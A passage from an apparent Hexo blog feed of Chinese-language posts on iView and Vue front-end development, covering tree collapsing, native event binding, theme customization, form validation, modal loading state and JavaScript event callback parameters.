      treeData<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span>
        item<span class="token punctuation">.</span>nodeKey <span class="token operator">===</span> currentNode<span class="token punctuation">.</span>nodeKey
          <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              finalParentNode <span class="token operator">=</span> parentNode<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
          <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              item<span class="token punctuation">.</span>children
                <span class="token operator">?</span> <span class="token function">findParentInner</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> item<span class="token punctuation">)</span>
                <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 执行内部函数</span>
    <span class="token function">findParentInner</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> finalParentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> finalParentNode<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">/*
   * 传入树数据，当前点击节点
   * 折叠树
   */</span>
  <span class="token keyword">function</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    treeData<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 若遍历节点为折叠则什么都不做，若为展开则判断遍历节点与当前节点nodeKey是否相同，若相同则什么都不做，否则设为折叠</span>
      item<span class="token punctuation">.</span>expand
        <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            item<span class="token punctuation">.</span>nodeKey <span class="token operator">===</span> currentNode<span class="token punctuation">.</span>nodeKey <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>expand <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 若遍历节点存在子节点则递归此函数，否则什么都不做</span>
      item<span class="token punctuation">.</span>children <span class="token operator">?</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// 找到当前点击节点的父节点</span>
  <span class="token keyword">let</span> parentNode <span class="token operator">=</span> <span class="token function">findParent</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 折叠树，若父节点为null，则为根节点，传入所有树数据（根节点）；若不为null，则传入父节点的子节点</span>
  parentNode <span class="token operator">===</span> <span class="token keyword">null</span>
    <span class="token operator">?</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span>
    <span class="token operator">:</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>parentNode<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>iview</category>
      </categories>
      <tags>
        <tag>accordion tree</tag>
        <tag>手风琴树</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>iview一些组件无法绑定事件</title>
    <url>/2018/12/06/iview%E4%B8%80%E4%BA%9B%E7%BB%84%E4%BB%B6%E6%97%A0%E6%B3%95%E7%BB%91%E5%AE%9A%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="iview无法绑定点击等事件"><a href="#iview无法绑定点击等事件" class="headerlink" title="iview无法绑定点击等事件"></a>iview无法绑定点击等事件</h1><p>在使用iview过程中，我们会发现有时候在一些组件上监听click或其他事件时并没有按照我们预期的情况执行，这是因为被封装的组件在底层上可能并不是用一个可以绑定click事件的vue组件实现的，所以无法直接绑定click事件，这个时候我们可以用事件修饰符.native绑定原生事件。例如v-on:click.native，这样就可以绑定成功了。</p>
]]></content>
      <tags>
        <tag>iview</tag>
        <tag>事件</tag>
      </tags>
  </entry>
  <entry>
    <title>iview定制主题</title>
    <url>/2018/11/08/iview%E5%AE%9A%E5%88%B6%E4%B8%BB%E9%A2%98/</url>
    <content><![CDATA[<p>如果你的项目使用了 webpack 工程，可以通过变量覆盖的方式来实现主题定制。首先在项目中先建一个目录，比如 my-theme，然后在 my-theme 下建立一个 less 文件 index.less，并写入下面内容：</p>
<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">@import &#39;~iview&#x2F;src&#x2F;styles&#x2F;index.less&#39;;
&#x2F;* 例子 *&#x2F;
&#x2F;* 完整的变量列表可以查看 默认样式变量。 *&#x2F;
@primary-color: #8c0776;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后在入口文件 main.js 内导入这个 less 文件即可：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">"vue"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> iView <span class="token keyword">from</span> <span class="token string">"iview"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">"../my-theme/index.less"</span><span class="token punctuation">;</span>
Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>iView<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意: 要在项目中使用 npm 安装 less 与 less-loader 否则运行和打包时都会报错，在 vue 新的版本中可能安装 less 和 less-loader 后还会报 inline javascript is not enabled. 可以在 vue.config.js 配置文件中写入如下配置来解决：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  css<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    loaderOptions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      less<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        javascriptEnabled<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>iview</category>
      </categories>
      <tags>
        <tag>iview</tag>
        <tag>自定义主题</tag>
      </tags>
  </entry>
  <entry>
    <title>iview未显示在视图中的表单不进行验证</title>
    <url>/2019/02/11/iview%E6%9C%AA%E6%98%BE%E7%A4%BA%E5%9C%A8%E8%A7%86%E5%9B%BE%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%8D%95%E4%B8%8D%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<h1 id="iview未显示在视图中的表单不进行验证"><a href="#iview未显示在视图中的表单不进行验证" class="headerlink" title="iview未显示在视图中的表单不进行验证"></a>iview未显示在视图中的表单不进行验证</h1><p>在使用表单的过程中，我们经常会碰到后面的表单内容依据前面表单项的选择不同而发生变化的情况，这种时候我们需要表单验证工具根据条件不再对未渲染的表单项进行验证。</p>
<p>要实现未显示在视图中的表单不被验证，应注意表单的条件渲染不能使用vue的v-show，而应该使用v-if，因为v-show只是切换display属性不再显示表单，但是表单还是被渲染并存在于DOM树中的，这时表单验证工具还是会生效的，而使用v-if，表单项在为false的条件下，不会被渲染，表单验证也就不会生效了。</p>
]]></content>
      <categories>
        <category>iview</category>
      </categories>
      <tags>
        <tag>iview</tag>
        <tag>表单验证</tag>
        <tag>条件渲染</tag>
      </tags>
  </entry>
  <entry>
    <title>iview模态框设置loading后表单验证失败无法清除loading状态</title>
    <url>/2019/02/12/iview%E6%A8%A1%E6%80%81%E6%A1%86%E8%AE%BE%E7%BD%AEloading%E5%90%8E%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5%E6%97%A0%E6%B3%95%E6%B8%85%E9%99%A4loading%E7%8A%B6%E6%80%81/</url>
    <content><![CDATA[<h1 id="iview-模态框设置-loading-后表单验证失败无法清除-loading-状态"><a href="#iview-模态框设置-loading-后表单验证失败无法清除-loading-状态" class="headerlink" title="iview 模态框设置 loading 后表单验证失败无法清除 loading 状态"></a>iview 模态框设置 loading 后表单验证失败无法清除 loading 状态</h1><p>在使用 iview 模态框过程中我们使用确定按钮异步提交信息，提交成功后才关闭模态框，但我们发现若无法通过表单验证，禁止提交时，确定按钮的 loading 状态无法清除，无法修改表单后再次提交信息。官方文档中也没有关于这一点的说明，查阅官方 issue 后发现了<a href="https://github.com/iview/iview/issues/597">解决方案</a>。即先将loading状态设置为false，再使用this.$nextTick在下次将loading状态设置为true。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Modal</span> <span class="token attr-name">:loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modalLoading<span class="token punctuation">"</span></span> <span class="token attr-name">@on-ok</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submitForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Modal</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
    name<span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
        modalLoading<span class="token operator">:</span> <span class="token boolean">true</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 改变loading状态函数</span>
      <span class="token function">changeLoading</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 将loading状态设置为关闭</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>modalLoading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token comment">// 下次模态框加载时重置loading状态为true</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>modalLoading <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token comment">// 点击确定执行的函数</span>
      <span class="token function">submitForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// iview表单验证</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>form<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token parameter">valid</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>valid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"表单验证成功，异步执行确定请求"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 表单验证失败时重置loading状态</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">changeLoading</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>iview</category>
      </categories>
      <tags>
        <tag>iview</tag>
        <tag>modal</tag>
        <tag>模态框</tag>
      </tags>
  </entry>
  <entry>
    <title>iview表单设计器开发总结</title>
    <url>/2019/09/10/iview%E8%A1%A8%E5%8D%95%E8%AE%BE%E8%AE%A1%E5%99%A8%E5%BC%80%E5%8F%91%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="使用到的库"><a href="#使用到的库" class="headerlink" title="使用到的库"></a>使用到的库</h2><p>vuedraggable——基于SortableJS的vue库，表单设计器拖拽设计功能的核心。</p>
<p>iview——核心UI框架，大部分组件都基于iview组件库</p>
<h2 id="开发思考"><a href="#开发思考" class="headerlink" title="开发思考"></a>开发思考</h2><ol>
<li><p>字段写活后，代码书写逻辑中并不知晓代码运行时传入的字段，只能通过增加额外的固定的字段来告知书写逻辑运行时传入的活字段是什么。</p>
</li>
<li><p>异步问题。所有的后端数据都要通过异步的ajax请求获取，当有同步需求时，使用async和await。值得注意的是await只能在async内部使用，即async函数只能return出一个promise而无法将await的值return出来。</p>
</li>
<li><p>在Array.prototype.map方法中使用async函数做为回调，想要等待所有promise返回值后再进行下一步的操作，应使用promise.all方法。也可以尝试promise的一个库——bluebird，这个库中有异步处理map等数组遍历的方法。</p>
</li>
<li><p>vue生命周期相关。mounted与updated钩子函数不会承诺所有子组件也被挂载，若要等视图渲染完成后执行某代码逻辑，应将该逻辑放在mounted或updated中的vm.$nextTick回调中。</p>
</li>
<li><p>computed计算属性set的妙用。通常如果后端数据库中保存的值与前端表单中要双向绑定的值不同时，我们会在异步获取数据时将后端值转为前端值，在提交逻辑中再将前端值转为后端值。这种情况下，前后端值不一致的区间是从获取开始直到提交给后端结束，这样的代码逻辑在写业务时确实没有问题，但是在字段写活的情况下，获取数据与提交表单的逻辑中并不知道哪些字段前端所需要值与后端值不一致需要处理，而唯一知道当前字段是谁，是否需要做处理的地方只有表单双向绑定的地方，因此允许前后端值不一致的地方仅剩表单中双向绑定时的一个时间点了，而不是一个很大的区间。那么我们要使前后端值不一致一区间最小化，即只在表单中双向绑定的地方允许前后端值不一致，其他时候都是使用后端值。这就要用到computed计算属性了，双向绑定中不再绑定后端传过来的值，而是绑定一个后端值转为前端值的计算属性，这是计算属性的get，光有get只能实现双向绑定的回填，无法实现双向绑定的修改，那么重点就是计算属性的set，在计算属性的set中写一个函数，将双向绑定值再次转回为后端要求的格式，这样就实现了前后端值不一致区间的最小化，仅剩双向绑定时的一个点。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>iview</category>
      </categories>
      <tags>
        <tag>iview</tag>
        <tag>表单设计器</tag>
      </tags>
  </entry>
  <entry>
    <title>iview自定义主题报错</title>
    <url>/2018/10/21/iview%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%BB%E9%A2%98%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<h1 id="iview-自定义主题报错"><a href="#iview-自定义主题报错" class="headerlink" title="iview 自定义主题报错"></a>iview 自定义主题报错</h1><p>首先确认安装了 less 和 less-loader，如果仍然报错，且报错为 Inline Javascript is not enabled. Is it set in your option? 这说明 less-loader 的配置没有开启行内使用 Js。应该在 vue.config.js 中设置，由于 vue-cli3.0 后，vue.config.js 不再默认出现在文件目录中，所以要手动新建该文件。然后在文件中设置开启 inline Javascript 如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    css<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        loaderOptions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 向 CSS 相关的 loader 传递选项</span>
            less<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                javascriptEnabled<span class="token operator">:</span> <span class="token boolean">true</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>若是 vue2.X 版本则应该在 webpack.base.config.js 中配置如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span> loader<span class="token operator">:</span> <span class="token string">'less-loader'</span><span class="token punctuation">,</span> options<span class="token operator">:</span> <span class="token punctuation">&#123;</span> javascriptEnabled<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      <categories>
        <category>iview</category>
      </categories>
      <tags>
        <tag>iview</tag>
        <tag>自定义主题</tag>
      </tags>
  </entry>
  <entry>
    <title>iview菜单栏在浏览器刷新-前进-后退后保持正确的选中与打开状态</title>
    <url>/2018/11/10/iview%E8%8F%9C%E5%8D%95%E6%A0%8F%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E5%88%B7%E6%96%B0-%E5%89%8D%E8%BF%9B-%E5%90%8E%E9%80%80%E5%90%8E%E4%BF%9D%E6%8C%81%E6%AD%A3%E7%A1%AE%E7%9A%84%E9%80%89%E4%B8%AD%E4%B8%8E%E6%89%93%E5%BC%80%E7%8A%B6%E6%80%81/</url>
    <content><![CDATA[<p>使用iview菜单栏后，我们会发现菜单栏在刷新后会回到初始选中与打开状态，而在浏览器前进与后退后依然保持前进或后退前的选中与打开状态。如何让菜单栏跟随浏览器保持正确的选中与打开状态呢？</p>
]]></content>
      <categories>
        <category>iview</category>
      </categories>
      <tags>
        <tag>iview</tag>
        <tag>菜单栏</tag>
        <tag>刷新</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript事件回调参数</title>
    <url>/2018/12/06/javascript%E4%BA%8B%E4%BB%B6%E5%9B%9E%E8%B0%83%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<h1 id="javascript的事件回调参数"><a href="#javascript的事件回调参数" class="headerlink" title="javascript的事件回调参数"></a>javascript的事件回调参数</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">haha</span><span class="token punctuation">(</span><span class="token parameter">abc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>abc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 声明一个参数，则该参数为事件，同时也可以使用默认事件变量event</span>
ele<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// event</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token comment">// event</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 不声明参数，则默认传入event</span>
ele<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// event</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 声明一个命名函数，也是同样道理</span>
ele<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token function">haha</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// event</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


ele<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token function">haha</span><span class="token punctuation">(</span><span class="token parameter">abc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>abc<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// event</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// event</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

ele<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> haha<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// event event</span>

<span class="token comment">// 相当于页面加载时直接执行haha函数，并不是在点击时调用，此时event一定为undefined，参数abc根据是否传入而定，若不传则为undefined，否则为传入的值本身。</span>
ele<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token function">haha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined undefined</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过上面的代码我们可以看出，在javascript中使用addEventLister监听事件，并不能给回调函数携带参数，只能自定义event的变量名，或者使用默认的event变量。默认的event变量是自动传入回调函数的。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">haha</span><span class="token punctuation">(</span><span class="token parameter">abc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>abc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 不传参数时可以取到默认的event， --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">haha</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- undefined event --></span>

<span class="token comment">&lt;!-- 传了参数可以取到参数与默认的event --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">haha</span><span class="token punctuation">(</span><span class="token string">'haha'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- haha event --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在html中监听事件，可以传递参数，event依然默认传入函数中，若声明函数参数时，声明了和event同名的参数，则要将实参event传入函数，否则打印event报undefined。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 声明形参event</span>
<span class="token keyword">function</span> <span class="token function">haha</span><span class="token punctuation">(</span><span class="token parameter">abc<span class="token punctuation">,</span> event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>abc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 不传参数时无法取到默认的event， --></span>
